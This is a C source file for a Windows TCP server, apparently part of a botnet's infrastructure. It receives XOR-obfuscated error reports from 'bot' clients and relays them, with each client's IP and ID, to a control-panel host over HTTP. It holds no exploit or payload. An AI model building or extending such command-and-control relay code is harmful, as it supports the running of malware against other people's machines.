#include "telemetry.h"

DWORD dwID = 0;


DWORD WINAPI SessionThread(PCLIENT pclient)
{
    HRESULT hr = S_OK;
    PTELEMETRY_REQUEST ptr = NULL;
    PTELEMETRY_RESPONSE pts = NULL;
    PCHAR pszHost = NULL;
    PCHAR pszRequest = NULL;
    PCHAR pszResponse = NULL;
    SIZE_T nStringLen = 0;
    DWORD dwBytesRecv = 0;
    DWORD dwBytesSent = 0;
    DWORD dwResponse = 0;
    INT nTimeOut = BOT_RECV_TIMEOUT;
    INT nRead = 0;
    INT nSend = 0;

    if (setsockopt(pclient->hSock, SOL_SOCKET, SO_RCVTIMEO, &nTimeOut, sizeof(INT)))
    {
        wprintf(L"ERROR: %d, line - %d\n", WSAGetLastError(), __LINE__);
        goto cleanup;
    }

    ptr = (PTELEMETRY_REQUEST)MemoryAllocate(NULL, sizeof(TELEMETRY_REQUEST));
    if (ptr == NULL)
    {
        wprintf(L"ERROR: %d, line - %d\n", GetLastError(), __LINE__);
        goto cleanup;
    }

    for (;;)
    {
        nRead = recv(pclient->hSock, (LPVOID)ptr + dwBytesRecv, MemorySize(ptr) - dwBytesRecv, 0);
        if (nRead > 0)
        {
            dwBytesRecv = dwBytesRecv + nRead;

            if (MemorySize(ptr) <= dwBytesRecv)
            {
                break;
            }
        }
        else
        {
            if (dwBytesRecv < MemorySize(ptr))
            {
                wprintf(L"ERROR: %d, line - %d\n", WSAGetLastError(), __LINE__);
                goto cleanup;
            }
            else
            {
                break;
            }
        }

        Sleep(1);
    }

    if (ptr->dwMagic != MAGIC_TELEMETRY_REQUEST)
    {
        wprintf(L"ERROR: wrong magic!\n");
        goto cleanup;
    }

    if (!XorData(ptr->szModule, sizeof(ptr->szModule) / sizeof(DWORD), ptr->dwMagic))
    {
        wprintf(L"ERROR: %d, line - %d\n", GetLastError(), __LINE__);
        goto cleanup;
    }

    hr = StringCchLengthA(ptr->szModule, STRSAFE_MAX_CCH, &nStringLen);
    if (FAILED(hr))
    {
        wprintf(L"ERROR: %d, line - %d\n", hr, __LINE__);
        goto cleanup;
    }

    if (nStringLen >= sizeof(ptr->szModule))
    {
        wprintf(L"ERROR: %d, line - %d\n", GetLastError(), __LINE__);
        goto cleanup;
    }

    if (!XorData(ptr->szFile, sizeof(ptr->szFile) / sizeof(DWORD), ptr->dwMagic))
    {
        wprintf(L"ERROR: %d, line - %d\n", GetLastError(), __LINE__);
        goto cleanup;
    }

    hr = StringCchLengthA(ptr->szFile, STRSAFE_MAX_CCH, &nStringLen);
    if (FAILED(hr))
    {
        wprintf(L"ERROR: %d, line - %d\n", hr, __LINE__);
        goto cleanup;
    }

    if (nStringLen >= sizeof(ptr->szFile))
    {
        wprintf(L"ERROR: %d, line - %d\n", GetLastError(), __LINE__);
        goto cleanup;
    }

    pszHost = (PCHAR)MemoryAllocate(NULL, NI_MAXHOST);
    if (pszHost == NULL)
    {
        wprintf(L"ERROR: %d, line - %d\n", GetLastError(), __LINE__);
        goto cleanup;
    }

    if (getnameinfo((PSOCKADDR)&pclient->ss, sizeof(SOCKADDR_STORAGE), pszHost, MemorySize(pszHost), NULL, 0, NI_NUMERICHOST) != 0)
    {
        wprintf(L"ERROR: %d, line - %d\n", WSAGetLastError(), __LINE__);
        goto cleanup;
    }

    pszRequest = (PCHAR)MemoryAllocate(NULL, 1024);
    if (pszRequest == NULL)
    {
        wprintf(L"ERROR: %d, line - %d\n", GetLastError(), __LINE__);
        goto cleanup;
    }

    hr = StringCbPrintfA(pszRequest, MemorySize(pszRequest), "GET %ls?ip=%s&id=%08X&version=%d&string=%d&error=0x%08X&module=%s&file=%s HTTP/1.0\r\nHost: %ls\r\n\r\n", TELEMETRY_URI, pszHost, ptr->dwID, ptr->dwVersion, ptr->dwString, ptr->dwError, ptr->szModule, ptr->szFile, CONTROL_PANEL);
    if (FAILED(hr))
    {
        wprintf(L"ERROR: %d, line - %d\n", hr, __LINE__);
        goto cleanup;
    }

    hr = StringCchLengthA(pszRequest, STRSAFE_MAX_CCH, &nStringLen);
    if (FAILED(hr))
    {
        wprintf(L"ERROR: %d, line - %d\n", hr, __LINE__);
        goto cleanup;
    }

    pszResponse = (PCHAR)TCPRequest(CONTROL_PANEL, 80, CP_RECV_TIMEOUT, pszRequest, nStringLen, &dwResponse);
    if (pszResponse == NULL)
    {
        wprintf(L"ERROR: %d, line - %d\n", GetLastError(), __LINE__);
        goto cleanup;
    }

    pszResponse = (PCHAR)MemoryAllocate(pszResponse, dwResponse + 1);
    if (pszResponse == NULL)
    {
        wprintf(L"ERROR: %d, line - %d\n", GetLastError(), __LINE__);
        goto cleanup;
    }

    if (StrStrA(pszResponse, CP_RESPONSE) != NULL)
    {
        pts = MemoryAllocate(NULL, sizeof(TELEMETRY_RESPONSE));
        if (pts == NULL)
        {
            wprintf(L"ERROR: %d, line - %d\n", GetLastError(), __LINE__);
            goto cleanup;
        }

        pts->dwMagic = MAGIC_TELEMETRY_RESPONSE;

        do
        {
            nSend = send(pclient->hSock, (LPVOID)pts + dwBytesSent, MemorySize(pts) - dwBytesSent, 0);
            if (nSend == SOCKET_ERROR)
            {
                wprintf(L"ERROR: %d, line - %d\n", WSAGetLastError(), __LINE__);
                goto cleanup;
            }

            dwBytesSent = dwBytesSent + nSend;
        }
        while (dwBytesSent < MemorySize(pts));

        printf("  %s (%08X) - %s:%d, 0x%08X\n", pszHost, ptr->dwID, ptr->szFile, ptr->dwString, ptr->dwError);
    }
    else
    {
        wprintf(L"ERROR: BAD RESPONSE FROM CONTROL PANEL!\n");
        goto cleanup;
    }

cleanup:
    if (ptr != NULL) MemoryFree(ptr);
    if (pts != NULL) MemoryFree(pts);
    if (pszHost != NULL) MemoryFree(pszHost);
    if (pszRequest != NULL) MemoryFree(pszRequest);
    if (pszResponse != NULL) MemoryFree(pszResponse);

    if (pclient != NULL)
    {
        if (pclient->hSock != INVALID_SOCKET)
        {
            shutdown(pclient->hSock, SD_BOTH);
            closesocket(pclient->hSock);
        }

        MemoryFree(pclient);
    }

    return 0;
}


VOID Start()
{
    WSADATA wsa;
    ADDRINFO ai;
    SOCKADDR_STORAGE ss;
    fd_set Read;
    SOCKET hServerSock[FD_SETSIZE];
    SOCKET hClientSock;
    HRESULT hr = S_OK;
    HANDLE hThread = NULL;
    PCLIENT pclient = NULL;
    LPADDRINFO paiList = NULL;
    LPADDRINFO pai = NULL;
    PWCHAR pwszPort = NULL;
    DWORD dwThreadId = 0;
    DWORD dwCnt = 0;
    DWORD dwSockNum = 0;
    INT nOptVal = 1;
    INT nStructSize = 0;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        wprintf(L"ERROR: %d, line - %d\n", WSAGetLastError(), __LINE__);
        goto cleanup;
    }

    pwszPort = (PWCHAR)MemoryAllocate(NULL, (6 * sizeof(WCHAR)));
    if (pwszPort == NULL)
    {
        wprintf(L"ERROR: %d, line - %d\n", GetLastError(), __LINE__);
        goto cleanup;
    }

    hr = StringCbPrintfW(pwszPort, MemorySize(pwszPort), L"%d", TELEMETRY_PORT);
    if (FAILED(hr))
    {
        wprintf(L"ERROR: %d, line - %d\n", hr, __LINE__);
        goto cleanup;
    }

    SecureZeroMemory(&ai, sizeof(ADDRINFO));
    ai.ai_family = AF_UNSPEC;
    ai.ai_socktype = SOCK_STREAM;
    ai.ai_protocol = IPPROTO_TCP;
    ai.ai_flags = AI_PASSIVE;

    if (GetAddrInfoW(NULL, pwszPort, &ai, &paiList) != 0)
    {
        wprintf(L"ERROR: %d, line - %d\n", WSAGetLastError(), __LINE__);
        goto cleanup;
    }

    for (dwCnt = 0; dwCnt < (sizeof(hServerSock) / sizeof(hServerSock[0])); dwCnt++)
    {
        hServerSock[dwCnt] = INVALID_SOCKET;
    }

    for (dwCnt = 0, pai = paiList; pai != NULL; pai = pai->ai_next)
    {
        if (dwCnt == FD_SETSIZE)
        {
            wprintf(L"ERROR: %d, line - %d\n", WSAGetLastError(), __LINE__);
            goto cleanup;
        }

        if ((pai->ai_family != AF_INET) && (pai->ai_family != AF_INET6))
        {
            wprintf(L"ERROR: %d, line - %d\n", WSAGetLastError(), __LINE__);
            continue;
        }

        hServerSock[dwCnt] = socket(pai->ai_family, pai->ai_socktype, pai->ai_protocol);
        if (hServerSock[dwCnt] == INVALID_SOCKET)
        {
            wprintf(L"ERROR: %d, line - %d\n", WSAGetLastError(), __LINE__);
            goto cleanup;
        }

        if (setsockopt(hServerSock[dwCnt], SOL_SOCKET, SO_REUSEADDR, &nOptVal, sizeof(INT)) == SOCKET_ERROR)
        {
            wprintf(L"ERROR: %d, line - %d\n", WSAGetLastError(), __LINE__);
            goto cleanup;
        }

        if (bind(hServerSock[dwCnt], pai->ai_addr, pai->ai_addrlen) == SOCKET_ERROR)
        {
            wprintf(L"ERROR: %d, line - %d\n", WSAGetLastError(), __LINE__);
            goto cleanup;
        }

        if (listen(hServerSock[dwCnt], SOMAXCONN) == SOCKET_ERROR)
        {
            wprintf(L"ERROR: %d, line - %d\n", WSAGetLastError(), __LINE__);
            goto cleanup;
        }

        dwCnt++;
    }

    wprintf(L"[*] START TELEMETRY SERVICE...\n\n");

    dwSockNum = dwCnt;

    for (;;)
    {
        FD_ZERO(&Read);

        for (dwCnt = 0; dwCnt < dwSockNum; dwCnt++)
        {
            FD_SET(hServerSock[dwCnt], &Read);
        }

        if (select(0, &Read, NULL, NULL, NULL)  == SOCKET_ERROR)
        {
            wprintf(L"ERROR: %d, line - %d\n", WSAGetLastError(), __LINE__);
        }

        for (dwCnt = 0; dwCnt < dwSockNum; dwCnt++)
        {
            if (FD_ISSET(hServerSock[dwCnt], &Read))
            {
                break;
            }
        }

        SecureZeroMemory(&ss, sizeof(SOCKADDR_STORAGE));
        nStructSize = sizeof(SOCKADDR_STORAGE);

        hClientSock = accept(hServerSock[dwCnt], (PSOCKADDR)&ss, &nStructSize);
        if (hClientSock != INVALID_SOCKET)
        {
            pclient = MemoryAllocate(NULL, sizeof(CLIENT));
            if (pclient != NULL)
            {
                pclient->hSock = hClientSock;
                pclient->ss = ss;

                hThread = CreateThread(NULL, 0, SessionThread, pclient, 0, &dwThreadId);
                if (hThread != NULL)
                {
                    CloseHandle(hThread) ? hThread = NULL : 0;
                }
            }
        }
    }

cleanup:

    for (dwCnt = 0; dwCnt < (sizeof(hServerSock) / sizeof(hServerSock[0])); dwCnt++)
    {
        if (hServerSock[dwCnt] != INVALID_SOCKET)
        {
            shutdown(hServerSock[dwCnt], SD_BOTH);
            closesocket(hServerSock[dwCnt]);
        }
    }

    if (hClientSock != INVALID_SOCKET)
    {
        shutdown(hClientSock, SD_BOTH);
        closesocket(hClientSock);
    }

    if (paiList != NULL) FreeAddrInfoW(paiList);

    WSACleanup();
    ExitProcess(0);
}